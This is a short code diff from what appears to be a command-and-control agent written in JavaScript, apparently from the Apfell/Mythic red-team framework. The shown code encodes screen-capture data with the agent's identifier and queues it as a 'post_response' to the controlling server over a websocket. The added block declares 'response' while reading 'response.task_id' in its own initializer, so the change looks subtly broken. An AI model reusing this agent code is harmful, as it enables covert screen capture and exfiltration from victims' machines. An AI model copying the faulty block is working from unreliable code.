@@ -168,6 +168,12 @@ connection.onmessage = function (e) {
                                 let msg = btoa(unescape(encodeURIComponent(final)));
                                 out.push(msg);
                             }
+
+                            let response = {
+                                'task_id':response.task_id,
+                                'user_output':'screencapture complete',
+                                'complete':true
+                            };
                             
                             let outer_response = {
                                 'action':'post_response',
@@ -179,7 +185,7 @@ connection.onmessage = function (e) {
                             let final = apfell.apfellid + enc;
                             let msg = btoa(unescape(encodeURIComponent(final)));
                             out.push(msg);
-                            
+
                             screencaptures[i] = {};
                             if (screencaptures.length === 1 ) {
                                 screencaptures = [];
